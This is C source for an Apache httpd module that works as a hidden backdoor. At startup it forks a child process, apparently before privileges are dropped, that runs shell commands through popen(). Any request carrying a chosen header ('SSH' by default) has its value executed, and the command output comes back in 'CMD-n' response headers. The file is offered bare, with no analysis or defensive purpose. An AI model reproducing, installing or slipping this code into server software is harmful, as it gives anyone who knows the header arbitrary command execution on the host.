#include <stdio.h>
#include "apr_hash.h"
#include "ap_config.h"
#include "ap_provider.h"
#include "httpd.h"
#include "http_core.h"
#include "http_config.h"
#include "http_log.h"
#include "http_protocol.h"
#include "http_request.h"

int pipe_commands[2];
int pipe_results[2];

#define BUFFSIZE 256
char buff[BUFFSIZE];

const char *userdata_key = "gaius_baltar";
const char *key_pipe_command_read  = "gaius_baltar_command_read";
const char *key_pipe_results_write = "gaius_baltar_results_write";
const char *key_ipc_rwlock = "gaius_baltar_lock_ipc";

const char *magic_end_of_file = "gaius_baltar_eof_magic";

char *baltar_header = "SSH";

static int sixs_code_config(apr_pool_t *p, apr_pool_t *log, apr_pool_t *temp, server_rec *s)
{
  void *data=NULL;
  void *pipedata=NULL;
  FILE *fpipe;

  const char *tempdir;

  apr_pool_userdata_get(&data, userdata_key, s->process->pool);

  if(data)
  {
    apr_pool_userdata_get(&pipe_commands[1], key_pipe_command_read , s->process->pool);
    apr_pool_userdata_get(&pipe_results[0], key_pipe_results_write, s->process->pool);

    return OK;
  }

  apr_pool_userdata_set((const void *)1, userdata_key, apr_pool_cleanup_null, s->process->pool);

  pipe(pipe_commands);
  pipe(pipe_results);

  apr_pool_userdata_set((const void *)pipe_commands[1], key_pipe_command_read , apr_pool_cleanup_null, s->process->pool);
  apr_pool_userdata_set((const void *) pipe_results[0], key_pipe_results_write, apr_pool_cleanup_null, s->process->pool);

  if(fork())
  {
    //papi
    close(pipe_commands[0]);        //no cal lectura
    close(pipe_results[1]);         //no cal escritura

    return OK;
  }
  else
  {
    //apache root
    close(pipe_commands[1]);        //no cal escritura
    close(pipe_results[0]);         //no cal lectura

    for(;;)
    {
      int bytes;
      while((bytes=read(pipe_commands[0],buff,BUFFSIZE))>0)
      {
        if( !(fpipe = (FILE*)popen(buff,"r")) )
          continue;
        char line[BUFFSIZE];

        while ( fgets( line, sizeof(line), fpipe))
        {
          int result_write=0;
          result_write=write(pipe_results[1],line,strlen(line)+1);
        }
        write(pipe_results[1],magic_end_of_file,strlen(magic_end_of_file)+1);
        pclose(fpipe);
        // write(pipe_results[1],buff,strlen(buff)+1);
        write(pipe_results[1],magic_end_of_file,strlen(magic_end_of_file)+1);
      }
    }
  }
  return OK;
}

static int sixs_code (request_rec *r)
{
  const char *ssh_header;
  char line[BUFFSIZE];
  char frak;
  char setheader[BUFFSIZE];
  int count=0;
  int linecount=0;

  ssh_header=apr_table_get(r->headers_in, baltar_header);

  if(ssh_header!=NULL)
  {
    fprintf(stderr,"SSH: %s.\n",ssh_header);

    write(pipe_commands[1],ssh_header,strlen(ssh_header));

    int bytes=0;
    while((bytes=read(pipe_results[0],&frak,1))>0)
    {
      if(frak!=0)
      {
        line[count]=frak;
        count++;
        continue;
      }

      line[count]=0;

      count=0;
      sprintf(setheader,"CMD-%d",++linecount);

      //EOF check
      if(strcmp(line,(char *)magic_end_of_file)==0)
        break;

      char *lol=line;
      while(*(++lol)!=NULL)
        if(*lol=='\n') *lol=' ';
      apr_table_set(r->headers_out, setheader, line);
    }
    apr_table_set(r->headers_out,"SSHout",ssh_header);
  }

  fflush(stderr);
  return DECLINED;
}

const char * baltar_set_header(cmd_parms *cmd, void *cfg, const char *arg)
{
    baltar_header = arg;
    return NULL;
}

static void register_hooks(apr_pool_t *p)
{
  ap_hook_handler(sixs_code, NULL, NULL, APR_HOOK_MIDDLE);
  ap_hook_post_config(sixs_code_config, NULL, NULL, APR_HOOK_FIRST);
}

static const command_rec baltar_directives[] =
{
    AP_INIT_TAKE1("BaltarHeader", baltar_set_header, NULL, RSRC_CONF, "Set baltar's header"),
    { NULL }
};

module AP_MODULE_DECLARE_DATA   baltar_module =
{
  STANDARD20_MODULE_STUFF,
  NULL,               /* Per-directory configuration handler */
  NULL,               /* Merge handler for per-directory configurations */
  NULL,               /* Per-server configuration handler */
  NULL,               /* Merge handler for per-server configurations */
  baltar_directives,  /* Any directives we may have for httpd */
  register_hooks      /* Our hook registering function */
};
